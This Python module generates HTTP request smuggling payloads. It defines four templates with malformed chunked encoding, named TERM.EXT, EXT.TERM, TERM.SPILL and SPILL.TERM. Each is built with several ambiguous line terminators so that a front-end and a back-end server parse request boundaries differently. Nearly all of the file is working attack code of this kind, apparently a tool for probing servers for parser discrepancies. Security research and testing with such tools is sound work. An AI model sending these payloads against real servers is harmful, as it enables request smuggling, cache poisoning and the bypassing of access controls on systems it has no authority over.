from abc import ABC, abstractmethod

class Payload(ABC):
    def __init__(self, method="POST", host="localhost", path="/", headers=None):
        self.method = method
        self.host = host
        self.path = path or "/"  # in case an empty path was supplied
        self.headers = headers or []

    @staticmethod
    def get_all_payloads():
        return Payload.__subclasses__()

    @property
    @abstractmethod
    def pretty_name(self):
        pass

    @property
    @abstractmethod
    def ambiguous_line_terminators(self): 
        pass

    @property
    @abstractmethod
    def payload_templ(self):
        pass

    def get_pretty_name(self):
        return self.pretty_name

    def build(self, line_terminator="\n"):
        # construct a variant of the payload
        headers = "\r\n".join(self.headers) + "\r\n" if self.headers else ""
        return self.payload_templ.format(
            host=self.host,
            method=self.method,
            path=self.path,
            headers=headers,
            line_terminator=line_terminator
        )

    def build_all(self):
        # construct all variants of the payload
        return [(repr(lt), self.build(line_terminator=lt)) for lt in self.ambiguous_line_terminators]


class TERM_EXT(Payload):
    @property
    def pretty_name(self):
        return "TERM.EXT"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2;{line_terminator}"
            "XX\r\n"
            "10\r\n"
            "1f\r\n"
            "AAAABBBBCCCC\r\n"
            "0\r\n"
            "\r\n"
            "DDDDEEEEFFFF\r\n"
            "0\r\n"
            "\r\n"
        )


class EXT_TERM(Payload):
    @property
    def pretty_name(self):
        return "EXT.TERM"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2;{line_terminator}"
            "XX\r\n"
            "22\r\n"
            "c\r\n"
            "AAAABBBBCCCC\r\n"
            "0\r\n"
            "\r\n"
            "DDDDEEEEFFFF\r\n"
            "0\r\n"
            "\r\n"
        )


class TERM_SPILL(Payload):
    @property
    def pretty_name(self):
        return "TERM.SPILL"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "", "XX", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "5\r\n"
            "AAAAA{line_terminator}c\r\n"
            "17\r\n"
            "AAAABBBB\r\n"
            "0\r\n"
            "\r\n"
            "CCCCDDDD\r\n"
            "0\r\n"
            "\r\n"
        )


class SPILL_TERM(Payload):
    @property
    def pretty_name(self):
        return "SPILL.TERM"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "", "XX", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "5\r\n"
            "AAAAA{line_terminator}1a\r\n"
            "8\r\n"
            "AAAABBBB\r\n"
            "0\r\n"
            "\r\n"
            "CCCCDDDD\r\n"
            "0\r\n"
            "\r\n"
        )

